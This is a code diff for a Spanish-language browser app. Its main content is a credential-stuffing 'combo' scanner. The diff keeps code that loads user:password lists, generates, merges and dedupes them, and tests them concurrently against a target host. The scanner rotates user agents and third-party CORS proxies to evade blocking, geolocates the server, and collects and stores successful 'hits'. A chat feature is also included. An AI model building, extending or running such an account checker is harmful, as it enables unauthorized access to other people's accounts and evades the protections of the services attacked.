-    let mergeData={file1:[],file2:[]};function unirCombos(){let f1=document.getElementById('mergeFile1').files[0];let f2=document.getElementById('mergeFile2').files[0];if(f1){let r=new FileReader();r.onload=e=>{mergeData.file1=e.target.result.split(/\r?\n/).filter(l=>l);actualizarMerge();};r.readAsText(f1);}if(f2){let r=new FileReader();r.onload=e=>{mergeData.file2=e.target.result.split(/\r?\n/).filter(l=>l);actualizarMerge();};r.readAsText(f2);}}function actualizarMerge(){let comb=mergeData.file1.concat(mergeData.file2);document.getElementById('mergeResultado').value=comb.join("\n");document.getElementById('btnDescargarMerge').disabled=comb.length===0;}
-    function descargarMergeResultado(){let txt=document.getElementById('mergeResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='merge.txt';a.click();}
-    function eliminarDuplicados(){let file=document.getElementById('dedupeFile').files[0];let text=document.getElementById('dedupeText').value;if(file){let r=new FileReader();r.onload=e=>{let lines=e.target.result.split(/\r?\n/).filter(l=>l);let unicos=[...new Set(lines)];document.getElementById('dedupeResultado').value=unicos.join("\n");document.getElementById('btnDescargarDedupe').disabled=false;};r.readAsText(file);}else if(text.trim()){let lines=text.split(/\r?\n/).filter(l=>l);let unicos=[...new Set(lines)];document.getElementById('dedupeResultado').value=unicos.join("\n");document.getElementById('btnDescargarDedupe').disabled=false;}else alert("Selecciona archivo o pega texto.");}
-    function descargarDedupeResultado(){let txt=document.getElementById('dedupeResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='dedupe.txt';a.click();}
-    document.querySelectorAll('.sub-tab').forEach(btn=>{btn.addEventListener('click',()=>{let subId=btn.getAttribute('data-sub');document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`sub-${subId}`).classList.add('active');});});
+    const nombresReales = ["juan","pedro","carlos","luis","andres","miguel","ana","maria","laura"];
+    function generarComboAvanzado(){ let tipo = document.getElementById('genType').value; let cantidad = parseInt(document.getElementById('genCantidad').value) || 100; let passLen = parseInt(document.getElementById('genPassLength').value) || 8; let sep = document.getElementById('genSep').value; let combos = new Set(); for(let i=0; i<cantidad*2 && combos.size<cantidad; i++){ let user = nombresReales[Math.floor(Math.random()*nombresReales.length)] + Math.floor(Math.random()*1000); let pass = Math.random().toString(36).substring(2, passLen); combos.add(user+sep+pass); } document.getElementById('comboResultado').value = Array.from(combos).join("\n"); document.getElementById('btnDescargarComboGen').disabled = false; }
+    function descargarComboGenerado(){ let txt = document.getElementById('comboResultado').value; if(!txt) return; const blob = new Blob([txt], {type:'text/plain'}); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'combo_generado.txt'; a.click(); a.remove(); }
+    let mergeData = { file1:[], file2:[] };
+    function unirCombos(){ let f1 = document.getElementById('mergeFile1').files[0]; let f2 = document.getElementById('mergeFile2').files[0]; if(f1){ let r = new FileReader(); r.onload = e => { mergeData.file1 = e.target.result.split(/\r?\n/).filter(l=>l); actualizarMerge(); }; r.readAsText(f1); } if(f2){ let r = new FileReader(); r.onload = e => { mergeData.file2 = e.target.result.split(/\r?\n/).filter(l=>l); actualizarMerge(); }; r.readAsText(f2); } }
+    function actualizarMerge(){ let combined = mergeData.file1.concat(mergeData.file2); document.getElementById('mergeResultado').value = combined.join("\n"); document.getElementById('btnDescargarMerge').disabled = combined.length === 0; }
+    function descargarMergeResultado(){ let txt = document.getElementById('mergeResultado').value; if(!txt) return; const blob = new Blob([txt], {type:'text/plain'}); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'combos_unidos.txt'; a.click(); a.remove(); }
+    function eliminarDuplicados(){ let file = document.getElementById('dedupeFile').files[0]; let text = document.getElementById('dedupeText').value; if(file){ let r = new FileReader(); r.onload = e => { let lines = e.target.result.split(/\r?\n/).filter(l=>l); let unicos = [...new Set(lines)]; document.getElementById('dedupeResultado').value = unicos.join("\n"); document.getElementById('btnDescargarDedupe').disabled = false; }; r.readAsText(file); } else if(text.trim()){ let lines = text.split(/\r?\n/).filter(l=>l); let unicos = [...new Set(lines)]; document.getElementById('dedupeResultado').value = unicos.join("\n"); document.getElementById('btnDescargarDedupe').disabled = false; } else alert("Selecciona archivo o pega texto."); }
+    function descargarDedupeResultado(){ let txt = document.getElementById('dedupeResultado').value; if(!txt) return; const blob = new Blob([txt], {type:'text/plain'}); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'combos_sin_duplicados.txt'; a.click(); a.remove(); }
+    document.querySelectorAll('.sub-tab').forEach(btn=>{ btn.addEventListener('click',()=>{ let subId = btn.getAttribute('data-sub'); document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active')); document.getElementById(`sub-${subId}`).classList.add('active'); }); });
 
-    // ========== NUEVO ESCÁNER (versión MUNRRA) ==========
-    // Variables globales del escáner
+    // ========== NUEVO ESCÁNER (MUNRRA) ==========
     let audioCtx = null;
     let serverIP = null, serverGeo = null;
     let JOB_PROXIES = {};
@@ -428,44 +629,13 @@
         'https://api.scraperapi.com/?url={url}'
     ];
 
-    function proxyIsCold(tpl){
-        const s = PROXY_FAILS.get(tpl);
-        return s && s.until && Date.now() < s.until;
-    }
-    function noteProxyFail(tpl){
-        const s = PROXY_FAILS.get(tpl) || { n:0, until:0 };
-        s.n++;
-        if(s.n >= PROXY_MAX_FAILS){
-            s.until = Date.now() + PROXY_COOLDOWN_MS;
-            s.n = 0;
-        }
-        PROXY_FAILS.set(tpl, s);
-    }
+    function proxyIsCold(tpl){ let d = PROXY_FAILS.get(tpl); return d && d.until && Date.now() < d.until; }
+    function noteProxyFail(tpl){ let d = PROXY_FAILS.get(tpl) || { n:0, until:0 }; d.n++; if(d.n >= PROXY_MAX_FAILS){ d.until = Date.now() + PROXY_COOLDOWN_MS; d.n = 0; } PROXY_FAILS.set(tpl, d); }
     function noteProxyOk(tpl){ PROXY_FAILS.delete(tpl); }
-
-    function randomUA(){
-        const uas = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-        ];
-        return uas[Math.floor(Math.random()*uas.length)];
-    }
-    function createSession(){
-        return { headers: { "User-Agent": randomUA(), "Accept": "application/json, text/javascript,*/*;q=0.9" }, cookies: {} };
-    }
-    function attachCookies(opts, session){
-        const cookieStr = Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; ");
-        if(cookieStr){ opts.headers = { ...(opts.headers||{}) }; opts.headers.Cookie = cookieStr; }
-        return opts;
-    }
-    function fetchTimeout(resource, options={}){
-        const {timeout=6000}=options;
-        const controller=new AbortController();
-        const id=setTimeout(()=>controller.abort(), timeout);
-        return fetch(resource, {...options, signal:controller.signal}).finally(()=>clearTimeout(id));
-    }
+    function randomUA(){ const uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"]; return uas[Math.floor(Math.random()*uas.length)]; }
+    function createSession(){ return { headers: { "User-Agent": randomUA(), "Accept": "application/json, text/javascript,*/*;q=0.9" }, cookies: {} }; }
+    function attachCookies(opts, session){ const cookieStr = Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; "); if(cookieStr){ opts.headers = { ...(opts.headers||{}) }; opts.headers.Cookie = cookieStr; } return opts; }
+    function fetchTimeout(resource, options={}){ const {timeout=6000}=options; const ctrl = new AbortController(); const id = setTimeout(()=>ctrl.abort(), timeout); return fetch(resource, {...options, signal:ctrl.signal}).finally(()=>clearTimeout(id)); }
     async function fetchWithCors(url, options = {}, jobId = null){
         const baseOpts = { cache:'no-store', keepalive:false, ...options };
         if(jobId && JOB_PROXIES[jobId]){
@@ -482,13 +652,8 @@
         try{
             const r = await fetchTimeout(url, baseOpts);
             if(r && r.ok) return r;
-        }catch(e){
-            if(!useCors.checked) throw e;
-        }
-        const pool = [...CORS_PROXIES].filter(tpl=>{
-            if(jobId && JOB_PROXIES[jobId] === tpl) return false;
-            return !proxyIsCold(tpl);
-        }).sort(()=>Math.random()-0.5);
+        }catch(e){ if(!useCors.checked) throw e; }
+        const pool = [...CORS_PROXIES].filter(tpl=>{ if(jobId && JOB_PROXIES[jobId] === tpl) return false; return !proxyIsCold(tpl); }).sort(()=>Math.random()-0.5);
         for(const tpl of pool){
             try{
                 const proxied = tpl.replace('{url}', encodeURIComponent(url));
@@ -499,48 +664,12 @@
         }
         throw new Error('Fetch failed');
     }
-    async function getJson(url, options = {}, jobId = null){
-        const r = await fetchWithCors(url, options, jobId);
-        if(!r.ok) throw new Error('Bad');
-        return await r.json();
-    }
+    async function getJson(url, options = {}, jobId = null){ const r = await fetchWithCors(url, options, jobId); if(!r.ok) throw new Error('Bad'); return await r.json(); }
     function limpiarHost(host){ return host.replace(/^https?:\/\//,'').trim(); }
-    async function resolveIP(domain){
-        try{
-            const clean = domain.split(':')[0];
-            if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
-            const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
-            if(!res.ok) return null;
-            const data = await res.json();
-            return data.Answer?.find(a=>a.type===1)?.data || null;
-        }catch{ return null; }
-    }
-    async function fetchGeo(ip){
-        try{
-            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`);
-            if(!res.ok) return null;
-            const data = await res.json();
-            if(data.status!=='success') return null;
-            return { ip, country:data.country||'N/D', city:data.city||'N/D', flag: (data.countryCode||'UN').toUpperCase().replace(/./g,c=>String.fromCodePoint(127397+c.charCodeAt())) };
-        }catch{ return null; }
-    }
-    function extractCombo(line){
-        if(!line) return null;
-        let s = String(line).normalize('NFKC').replace(/\s+/g,' ').trim();
-        const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
-        if(!m) return null;
-        const user = m[1].trim(), pass = m[2].trim();
-        if(!user || !pass) return null;
-        return [user, pass];
-    }
-    function summarizeCategories(cats, limit=40){
-        if(!Array.isArray(cats)||!cats.length) return `━━━━━━━━━━━━━━━\n• N/D`;
-        const names=cats.map(c=>c.category_name||c.name||'').filter(Boolean);
-        const shown=names.slice(0,limit);
-        const lines=shown.map(n=>`• ${n}`);
-        if(names.length>limit) lines.push(`• … (+${names.length-limit} más)`);
-        return `━━━━━━━━━━━━━━━\n${lines.join('\n')}`;
-    }
+    async function resolveIP(domain){ try{ const clean = domain.split(':')[0]; if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean; const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`); if(!res.ok) return null; const data = await res.json(); return data.Answer?.find(a=>a.type===1)?.data || null; }catch{ return null; } }
+    async function fetchGeo(ip){ try{ const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`); if(!res.ok) return null; const data = await res.json(); if(data.status!=='success') return null; return { ip, country:data.country||'N/D', city:data.city||'N/D', flag: (data.countryCode||'UN').toUpperCase().replace(/./g,c=>String.fromCodePoint(127397+c.charCodeAt())) }; }catch{ return null; } }
+    function extractCombo(line){ if(!line) return null; let s = String(line).normalize('NFKC').replace(/\s+/g,' ').trim(); const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u); if(!m) return null; const user = m[1].trim(), pass = m[2].trim(); if(!user || !pass) return null; return [user, pass]; }
+    function summarizeCategories(cats, limit=40){ if(!Array.isArray(cats)||!cats.length) return `━━━━━━━━━━━━━━━\n• N/D`; const names=cats.map(c=>c.category_name||c.name||'').filter(Boolean); const shown=names.slice(0,limit); const lines=shown.map(n=>`• ${n}`); if(names.length>limit) lines.push(`• … (+${names.length-limit} más)`); return `━━━━━━━━━━━━━━━\n${lines.join('\n')}`; }
 
     async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null){
         try{
@@ -604,9 +733,7 @@ ${liveCatsText}
         const content = document.createElement('pre'); content.className = 'hit-content'; content.textContent = hit.texto;
         div.appendChild(header); div.appendChild(content);
         hitsContainer.prepend(div);
-        if(ui.hitsCountEl){
-            ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-        }
+        if(ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
         if(soundToggle.checked && audioCtx){
             try{
                 const o = audioCtx.createOscillator(), g = audioCtx.createGain();
@@ -618,7 +745,6 @@ ${liveCatsText}
                 if(navigator.vibrate) navigator.vibrate(80);
             }catch(_){}
         }
-        // Guardar también en banco de hits local
         guardarHitEnBanco(hit.texto, hit.user, hit.pass);
     }
 
@@ -715,8 +841,8 @@ ${liveCatsText}
         a.remove();
     }
 
-    // Asignación de eventos y lógica de inicio del escáner
-    const hostInputScanner = document.getElementById('hostInput');
+    // Configuración del escáner
+    const hostInputScan = document.getElementById('hostInput');
     const concurrencyInputScan = document.getElementById('concurrencyInput');
     const startBtnScan = document.getElementById('startBtn');
     const stopBtnScan = document.getElementById('stopBtn');
@@ -728,14 +854,26 @@ ${liveCatsText}
     const useCorsCheck = document.getElementById('useCors');
     const soundToggleCheck = document.getElementById('soundToggle');
     const autoDownloadCheck = document.getElementById('autoDownload');
-    const hitsContainerScan = document.getElementById('hitsContainer');
+    const hitsContainer = document.getElementById('hitsContainer');
+    const progressBarFill = document.getElementById('progressBarFill');
+    const progressBarFill2 = document.getElementById('progressBarFill2');
+    const progressBarFill3 = document.getElementById('progressBarFill3');
+    const progressText = document.getElementById('progressText');
+    const progressText2 = document.getElementById('progressText2');
+    const progressText3 = document.getElementById('progressText3');
+    const currentCombo = document.getElementById('currentCombo');
+    const currentCombo2 = document.getElementById('currentCombo2');
+    const currentCombo3 = document.getElementById('currentCombo3');
+    const hitsCount1 = document.getElementById('hitsCount1');
+    const hitsCount2 = document.getElementById('hitsCount2');
+    const hitsCount3 = document.getElementById('hitsCount3');
 
     function updateStartStateScanner(){
-        const hasHost = !!hostInputScanner.value.trim();
+        const hasHost = !!hostInputScan.value.trim();
         const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
         startBtnScan.disabled = !(hasHost && hasAnyCombos);
     }
-    function readTxtFile(inputEl, targetArray){
+    function readTxtFileScanner(inputEl, targetArray){
         targetArray.length = 0;
         const f = inputEl.files?.[0];
         if(!f){ updateStartStateScanner(); return; }
@@ -750,9 +888,9 @@ ${liveCatsText}
         };
         r.readAsText(f);
     }
-    comboFile1Scan.addEventListener('change', ()=>readTxtFile(comboFile1Scan, combos1));
-    comboFile2Scan.addEventListener('change', ()=>readTxtFile(comboFile2Scan, combos2));
-    comboFile3Scan.addEventListener('change', ()=>readTxtFile(comboFile3Scan, combos3));
+    comboFile1Scan.addEventListener('change', ()=>readTxtFileScanner(comboFile1Scan, combos1));
+    comboFile2Scan.addEventListener('change', ()=>readTxtFileScanner(comboFile2Scan, combos2));
+    comboFile3Scan.addEventListener('change', ()=>readTxtFileScanner(comboFile3Scan, combos3));
     comboTxtScan.addEventListener('input', ()=>{
         combosTxt.length = 0;
         const raw = comboTxtScan.value || '';
@@ -765,11 +903,10 @@ ${liveCatsText}
         }
         updateStartStateScanner();
     });
-    hostInputScanner.addEventListener('input', updateStartStateScanner);
+    hostInputScan.addEventListener('input', updateStartStateScanner);
 
     startBtnScan.addEventListener('click', async ()=>{
         if(isRunning) return;
-        // Inicializar audio
         try{
             if(!audioCtx){
                 const Ctx = window.AudioContext || window.webkitAudioContext;
@@ -781,15 +918,13 @@ ${liveCatsText}
         saveBtnScan.disabled = true;
         stopBtnScan.disabled = true;
         stopRequested = false;
-        // Limpiar contenedor de hits y arrays
-        hitsContainerScan.innerHTML = '';
+        hitsContainer.innerHTML = '';
         HITS = { 1:[], 2:[], 3:[] };
         [hitsCount1, hitsCount2, hitsCount3].forEach(el=>{ if(el) el.innerHTML = `Hits: <span class="yellow-hit">0</span>`; });
-        [progressBarFill, progressBarFill2, progressBarFill3].forEach(el=>{ if(el) el.style.width='0%'; });
-        [progressText, progressText2, progressText3].forEach(el=>{ if(el) el.textContent='Resolviendo IP...'; });
-        [currentCombo, currentCombo2, currentCombo3].forEach(el=>{ if(el) el.textContent='Usuario actual: -'; });
-
-        const host = limpiarHost(hostInputScanner.value);
+        [progressBarFill, progressBarFill2, progressBarFill3].forEach(el=>{ if(el) el.style.width = '0%'; });
+        [progressText, progressText2, progressText3].forEach(el=>{ if(el) el.textContent = 'Resolviendo IP...'; });
+        [currentCombo, currentCombo2, currentCombo3].forEach(el=>{ if(el) el.textContent = 'Usuario actual: -'; });
+        const host = limpiarHost(hostInputScan.value);
         const baseConc = parseInt(concurrencyInputScan.value) || 80;
         serverIP = await resolveIP(host);
         serverGeo = serverIP ? await fetchGeo(serverIP) : null;
@@ -838,11 +973,11 @@ ${liveCatsText}
         [progressText, progressText2, progressText3].forEach(el=>{ if(el) el.textContent += ' | Scan detenido.'; });
     });
     saveBtnScan.addEventListener('click', ()=>{
-        const host = hostInputScanner.value;
+        const host = hostInputScan.value;
         if(!host) return;
         saveHitsAll(host, { allowEmpty:true, groupByJob:true, dedupe:true });
     });
-    // Traducciones básicas para el escáner (opcional)
+    // textos del escáner
     const lblHost = document.getElementById('lblHost');
     const lblCombo = document.getElementById('lblCombo');
     const lblComboText = document.getElementById('lblComboText');
@@ -862,15 +997,11 @@ ${liveCatsText}
     saveBtnScan.textContent = "GUARDAR EN TELÉFONO (.TXT)";
     updateStartStateScanner();
 
-    // ========== CHAT (corregido anteriormente) ==========
+    // ========== CHAT ==========
     let chatDisplayName = "", chatAvatar = "🦁";
     let currentReplyTo = null;
     let chatUnsubscribe = null;
-    function getUserColor(email) {
-        let hash = 0;
-        for (let i = 0; i < email.length; i++) hash = ((hash << 5) - hash) + email.charCodeAt(i);
-        return `hsl(${Math.abs(hash % 360)}, 70%, 60%)`;
-    }
+    function getUserColor(email) { let hash=0; for(let i=0;i<email.length;i++) hash=((hash<<5)-hash)+email.charCodeAt(i); return `hsl(${Math.abs(hash%360)}, 70%, 60%)`; }
     async function cargarPerfilUsuario(email) {
         const perfilRef = db.ref(`chat_profiles/${currentUser.uid}`);
         const snapshot = await perfilRef.once('value');
@@ -896,14 +1027,7 @@ ${liveCatsText}
         let newEmoji = prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
         if (newEmoji && newEmoji.trim()) document.getElementById('avatarSelect').textContent = newEmoji.trim();
     });
-    function escapeHtml(str) {
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        });
-    }
+    function escapeHtml(str) { return str.replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
     function formatMessageText(text, mentions) {
         let html = escapeHtml(text);
         mentions.forEach(m => {
@@ -941,12 +1065,8 @@ ${liveCatsText}
                 document.getElementById('replyBadge').style.display = 'flex';
                 document.getElementById('replyBadge').querySelector('span').innerHTML = `Respondiendo a ${escapeHtml(msg.userName)}: ${escapeHtml(msg.text.substring(0,40))}`;
             };
-            if (msgDiv.querySelector('.edit-btn')) {
-                msgDiv.querySelector('.edit-btn').onclick = () => editarMensaje(msg.id, msg.text);
-            }
-            if (msgDiv.querySelector('.delete-btn')) {
-                msgDiv.querySelector('.delete-btn').onclick = () => eliminarMensaje(msg.id);
-            }
+            if (msgDiv.querySelector('.edit-btn')) msgDiv.querySelector('.edit-btn').onclick = () => editarMensaje(msg.id, msg.text);
+            if (msgDiv.querySelector('.delete-btn')) msgDiv.querySelector('.delete-btn').onclick = () => eliminarMensaje(msg.id);
             container.appendChild(msgDiv);
         }
         container.scrollTop = container.scrollHeight;
@@ -992,38 +1112,24 @@ ${liveCatsText}
     }
     async function editarMensaje(msgId, oldText) {
         const newText = prompt("Editar mensaje:", oldText);
-        if (newText && newText !== oldText) {
-            await db.ref(`chat_messages/${msgId}`).update({ text: newText, edited: true });
-        }
+        if (newText && newText !== oldText) await db.ref(`chat_messages/${msgId}`).update({ text: newText, edited: true });
     }
     async function eliminarMensaje(msgId) {
-        if (confirm("¿Eliminar este mensaje?")) {
-            await db.ref(`chat_messages/${msgId}`).remove();
-        }
+        if (confirm("¿Eliminar este mensaje?")) await db.ref(`chat_messages/${msgId}`).remove();
     }
     function iniciarChat() {
         if (chatUnsubscribe) chatUnsubscribe();
         const messagesRef = db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);
         chatUnsubscribe = messagesRef.on('value', (snapshot) => {
             const messages = [];
-            snapshot.forEach(child => {
-                messages.push({ id: child.key, ...child.val() });
-            });
+            snapshot.forEach(child => { messages.push({ id: child.key, ...child.val() }); });
             messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
             renderizarMensajes(messages);
         });
     }
     document.getElementById('sendMsgBtn').addEventListener('click', enviarMensaje);
-    document.getElementById('chatInput').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter' && !e.shiftKey) {
-            e.preventDefault();
-            enviarMensaje();
-        }
-    });
-    document.getElementById('cancelReplyBtn').addEventListener('click', () => {
-        currentReplyTo = null;
-        document.getElementById('replyBadge').style.display = 'none';
-    });
+    document.getElementById('chatInput').addEventListener('keypress', (e) => { if(e.key === 'Enter' && !e.shiftKey){ e.preventDefault(); enviarMensaje(); } });
+    document.getElementById('cancelReplyBtn').addEventListener('click', () => { currentReplyTo = null; document.getElementById('replyBadge').style.display = 'none'; });
     function cargarMensajesChat() {}
 
     // ========== JUEGO ==========
